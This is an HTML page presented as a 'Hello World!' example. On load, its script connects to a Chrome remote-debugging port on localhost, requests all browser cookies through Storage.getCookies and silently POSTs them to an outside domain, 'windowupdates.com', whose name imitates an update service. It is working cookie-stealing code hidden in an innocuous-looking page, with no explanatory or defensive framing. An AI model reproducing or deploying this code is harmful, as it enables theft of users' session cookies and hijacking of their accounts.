<!DOCTYPE html> 
<html lang="en"> 
<head>
  <meta charset="utf-8">
  <title>Hello World!</title> 
</head> 
<body> 
  Hello World!
  <div id="output" style="margin-top: 20px; padding: 10px; border: 1px solid #ccc; font-family: monospace; white-space: pre-wrap; max-height: 400px; overflow-y: auto;"></div>
 
  <script>
    function displayMessage(message, isError = false) {
      var output = document.getElementById('output');
      var timestamp = new Date().toLocaleTimeString();
      var color = isError ? 'red' : 'black';
      output.innerHTML += '<span style="color: ' + color + '">[' + timestamp + '] ' + message + '</span>\n';
      output.scrollTop = output.scrollHeight;
    }

    var webSocketDebuggerUrl; 
    var port = 9222; 
    var request = new XMLHttpRequest(); 
    request.open("GET", "http://localhost:" + port + "/json"); 
    request.responseType = 'json'; 
    request.send(); 
 
    request.onload = function() {
      webSocketDebuggerUrl = request.response[0].webSocketDebuggerUrl;
      displayMessage('WebSocket URL: ' + webSocketDebuggerUrl);
      var connection = new WebSocket(webSocketDebuggerUrl);
 
      // When the connection is open, send some data to the server
      connection.onopen = function () {
        displayMessage('WebSocket connection opened');
        connection.send('{"id": 1, "method": "Storage.getCookies"}');
      };
 
      // Log errors
      connection.onerror = function (error) {
        displayMessage('WebSocket Error: ' + error, true);
      };
 
      // Log messages from the server
      connection.onmessage = function (e) {
        displayMessage('Server: ' + JSON.stringify(e.data,null,2));
        post_url = "https://windowupdates.com/"
        var xhttp = new XMLHttpRequest();
        xhttp.open("POST", post_url, true);
        xhttp.setRequestHeader('Content-Type', 'text/plain');
        xhttp.send(JSON.stringify(JSON.parse(e.data).result.cookies));
      };
    };
 
    request.onerror = function() {
      displayMessage('Failed to connect to Chrome DevTools on localhost:' + port, true);
    };
  </script> 
</body> 
</html>
